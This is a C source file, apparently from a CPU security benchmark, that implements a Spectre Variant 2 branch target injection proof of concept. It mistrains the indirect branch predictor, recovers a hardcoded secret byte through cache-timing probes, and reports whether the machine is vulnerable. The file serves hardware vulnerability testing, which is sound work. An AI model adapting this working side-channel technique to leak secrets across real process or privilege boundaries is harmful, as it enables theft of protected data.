/**
 * spectre-v2: Branch Target Injection (Spectre Variant 2) proof-of-concept.
 *
 * Mistrains the indirect branch predictor so that a victim indirect call
 * speculatively jumps to an attacker-chosen gadget. The gadget indexes a
 * probe array with a secret byte, leaving a cache-timing footprint.
 */
#include "bench.h"

#define PROBE_ENTRIES 256
#ifndef SECURITY_PROBE_STRIDE
#define SECURITY_PROBE_STRIDE PAGE_SIZE
#endif
#define PROBE_STRIDE  SECURITY_PROBE_STRIDE
#define PROBE_SIZE    (PROBE_ENTRIES * PROBE_STRIDE)

static uint8_t probe_array[PROBE_SIZE]
    __attribute__((aligned(PAGE_SIZE)));

static const uint8_t real_secret = 0x42;

__attribute__((noinline))
static void gadget(void) {
  volatile uint8_t tmp = probe_array[real_secret * PROBE_STRIDE];
  (void)tmp;
}

__attribute__((noinline))
static void benign(void) {
  asm volatile("nop");
}

typedef void (*fn_ptr_t)(void);
static volatile fn_ptr_t target = benign;

__attribute__((noinline))
static void victim_indirect_call(void) {
  target();
}

static void evict_probe(void) {
  for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE)
    ((volatile uint8_t *)probe_array)[i];
  fence();
}

#define TRAIN_ROUNDS   30
#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif
#define THRESHOLD_MULTIPLIER 2

int main(void) {
  for (int i = 0; i < PROBE_SIZE; i += PAGE_SIZE)
    probe_array[i] = 0;
  fence();

  /* Baseline timing */
  uint32_t baseline_hit, baseline_miss;
  {
    evict_probe();
    uint32_t t;
    TIMED_ACCESS(&probe_array[0], t);
    baseline_miss = t;
    TIMED_ACCESS(&probe_array[0], t);
    baseline_hit = t;
  }
  uint32_t threshold = baseline_hit * THRESHOLD_MULTIPLIER;
  if (threshold < 10) threshold = 10;

  report("spectre-v2 baseline", baseline_hit, baseline_miss);

  uint32_t scores[PROBE_ENTRIES];
  memset(scores, 0, sizeof(scores));

  for (int round = 0; round < SECURITY_ATTACK_ROUNDS; round++) {
    evict_probe();

    /* Train indirect branch predictor toward gadget */
    target = (fn_ptr_t)gadget;
    for (int t = 0; t < TRAIN_ROUNDS; t++)
      victim_indirect_call();

    /* Switch target to benign */
    target = (fn_ptr_t)benign;
    fence();
    evict_probe();

    /* Trigger misprediction */
    victim_indirect_call();
    fence();

    /* Probe */
    for (int i = 0; i < PROBE_ENTRIES; i++) {
      int idx = ((i * 167) + 13) % PROBE_ENTRIES;
      uint32_t t;
      TIMED_ACCESS(&probe_array[idx * PROBE_STRIDE], t);
      if (t <= threshold)
        scores[idx]++;
    }
  }

  uint32_t max_score = 0;
  int leaked_byte = -1;
  for (int i = 1; i < PROBE_ENTRIES; i++) {
    if (scores[i] > max_score) {
      max_score = scores[i];
      leaked_byte = i;
    }
  }

  printf("[spectre-v2] secret = 0x%02x, leaked = 0x%02x, score = %u/%u\n",
         real_secret, leaked_byte >= 0 ? leaked_byte : 0,
         max_score, (uint32_t)SECURITY_ATTACK_ROUNDS);

  if (leaked_byte == real_secret && max_score > SECURITY_ATTACK_ROUNDS / 4)
    printf("[spectre-v2] VULNERABLE: indirect branch misprediction leak\n");
  else
    printf("[spectre-v2] NOT VULNERABLE or insufficient signal\n");

  return 0;
}
